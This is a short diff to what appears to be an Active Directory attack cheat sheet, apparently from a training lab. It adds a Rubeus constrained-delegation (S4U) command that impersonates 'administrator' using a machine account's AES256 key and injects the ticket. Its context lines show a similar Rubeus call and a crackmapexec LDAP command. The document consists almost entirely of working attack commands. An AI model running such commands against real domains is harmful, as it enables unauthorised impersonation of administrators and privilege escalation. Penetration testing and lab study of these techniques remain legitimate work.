@@ -158,3 +158,5 @@ sudo crackmapexec ldap dc01.doamin.local -u 'uname' -p 'passwd' --kdcHost dc01.d
 
 [Rubeus.Program]::Main("$constr_srv_for_us /user:appsvc /impersonateuser:administrator /msdsspn:cifs/US-MSSQL.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /ptt".Split(" "))
 
+**Ex**
+[Rubeus.Program]::Main("$constr_srv_for_us /user:student72$ /aes256:038cc0e32fbb521fdda1e5f6ef98fee2df844f43cbc9c676edc7d514907a86f1 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt".Split(" "));
